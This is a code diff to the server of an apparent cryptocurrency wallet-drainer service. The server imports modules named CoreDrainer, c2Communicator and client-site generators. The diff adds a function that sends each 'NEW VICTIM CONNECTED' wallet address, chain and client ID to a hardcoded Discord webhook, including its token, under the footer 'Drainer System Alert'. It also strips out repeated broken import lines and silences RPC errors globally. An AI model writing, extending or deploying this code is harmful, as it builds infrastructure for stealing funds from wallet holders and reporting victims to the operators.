@@ -1,5 +1,4 @@
 import express from "express";
-import { sendDiscordAlert } from "./discord-alerts.js";
 // ==================== SIMPLE RPC ERROR SUPPRESSION ====================
 const originalError = console.error;
 console.error = (...args) => {
@@ -39,6 +38,38 @@ console.warn = (...args) => {
     return; // Silent fail
   }
   originalConsoleWarn.apply(console, args);
+
+// ==================== DISCORD NOTIFICATIONS ====================
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1426946015109578884/ldcLYMtw9lUR56CKhsBJKe30h9UmFKUN8cWPm502nQO1xyheglVfG_TUfg51Q17bWgp4';
+
+async function sendDiscordAlert(victimData) {
+  try {
+    const message = {
+      embeds: [{
+        title: "🎯 NEW VICTIM CONNECTED",
+        color: 0x00ff00,
+        fields: [
+          { name: "👤 Wallet", value: `\`${victimData.walletAddress}\``, inline: false },
+          { name: "⛓️ Chain", value: victimData.chain || 'Unknown', inline: true },
+          { name: "🕐 Time", value: new Date().toLocaleString(), inline: true },
+          { name: "🔗 Client", value: victimData.clientId || 'Direct', inline: true }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: "Drainer System Alert" }
+      }]
+    };
+
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(message)
+    });
+    
+    console.log('📢 Discord alert sent for:', victimData.walletAddress);
+  } catch (error) {
+    console.log('❌ Discord alert failed:', error.message);
+  }
+}
 };
 
 // Global unhandled rejection handler
@@ -54,61 +85,33 @@ process.on('unhandledRejection', (reason, promise) => {
 
 console.log('🔇 RPC Error suppression activated globally');
 import http from "http";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import cors from "cors";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { Server as SocketIOServer } from "socket.io";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import path from "path";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import fs from "fs";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import dotenv from "dotenv";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { SwapHandler } from './swapHandler.js'
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { fileURLToPath } from "url";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { dirname } from "path";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import trackHandler from "./api/track.js";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import fetch from "node-fetch";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import proxyHandler from './api/proxy.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import rateLimit from 'express-rate-limit';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import helmet from 'helmet';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { ethers } from "ethers";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { adminAuth } from "./admin-security.js";
-import { sendDiscordAlert } from "./discord-alerts.js";
 import multiSigManager from './lib/multiSigManager.js'; 
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { rotateRPC } from './lib/rpcDecoder.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { getExplorerApiKey, getRpcUrl } from './config.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { CoreDrainer } from './coreDrainer.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { flowCoordinator } from './modules/FlowCoordinator.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { uiManager } from './modules/UIManager.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { c2Communicator } from './modules/c2Communicator.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { securityManager } from './modules/securityManager.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { chainManager } from './modules/chainManager.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { generateClientSite } from './client-template.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import { generateMarketingSite } from './saas-website.js';
-import { sendDiscordAlert } from "./discord-alerts.js";
 import cron from "node-cron";
-import { sendDiscordAlert } from "./discord-alerts.js";
 
 // ==================== CONFIGURATION & INITIALIZATION ====================
 dotenv.config();
